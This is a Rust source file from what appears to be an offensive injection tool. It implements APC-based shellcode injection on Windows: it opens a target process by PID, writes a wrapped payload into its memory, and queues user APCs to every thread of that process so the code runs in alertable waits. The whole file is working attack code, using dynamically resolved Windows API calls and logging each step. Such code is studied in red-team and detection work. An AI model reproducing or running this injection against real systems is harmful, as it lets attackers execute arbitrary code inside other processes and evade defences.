use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use super::wrappers::wrap_for_apc;
    use crate::resolve;

    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_VM_WRITE: u32 = 0x0020;
    const THREAD_SET_CONTEXT: u32 = 0x0010;
    const TH32CS_SNAPTHREAD: u32 = 0x00000004;

    #[repr(C)]
    struct THREADENTRY32 {
        dw_size: u32,
        cnt_usage: u32,
        th32_thread_id: u32,
        th32_owner_process_id: u32,
        tp_base_pri: i32,
        tp_delta_pri: i32,
        dw_flags: u32,
    }

    log.step(format!("[1/5] Open target (PID {})", pid));
    let process_access =
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
    if process.is_null() {
        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
    }

    let wrapped = wrap_for_apc(shellcode);
    let size = wrapped.len();
    let base = write_remote_payload(process, &wrapped, 5, log)?;

    log.step("[5/5] Enumerating threads and queuing APCs");

    let snapshot = unsafe { resolve::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let invalid_handle = -1isize as *mut std::ffi::c_void;
    if snapshot.is_null() || snapshot == invalid_handle {
        free_remote(process, base, log);
        return Err("CreateToolhelp32Snapshot failed".to_string());
    }

    let mut entry: THREADENTRY32 = unsafe { std::mem::zeroed() };
    entry.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;

    let mut queued: u32 = 0;
    let mut total: u32 = 0;

    if unsafe { resolve::Thread32First(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } != 0 {
        loop {
            if entry.th32_owner_process_id == pid {
                total += 1;
                let thread = unsafe { resolve::OpenThread(THREAD_SET_CONTEXT, 0, entry.th32_thread_id) };
                if !thread.is_null() {
                    let apc_func = base as *const std::ffi::c_void;
                    if unsafe { resolve::QueueUserAPC(apc_func, thread, 0) } != 0 {
                        queued += 1;
                        log.info(format!(
                            "      queued APC to thread TID {}",
                            entry.th32_thread_id
                        ));
                    }
                    unsafe { resolve::CloseHandle(thread) };
                }
            }
            if unsafe { resolve::Thread32Next(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } == 0 {
                break;
            }
        }
    }
    unsafe { resolve::CloseHandle(snapshot) };

    if queued == 0 {
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        if total == 0 {
            return Err(format!("no threads found for PID {}", pid));
        }
        return Err(format!(
            "found {} threads but could not queue APC to any of them",
            total
        ));
    }

    unsafe { resolve::CloseHandle(process) };

    log.info(format!(
        "      APCs queued to {}/{} threads",
        queued, total
    ));
    log.info("      executes when a thread enters alertable wait (async)");
    log.info(format!(
        "      payload at {:#p} ({} bytes, wrapped {}+38)",
        base,
        size,
        size - 38
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("requires Windows".to_string())
}
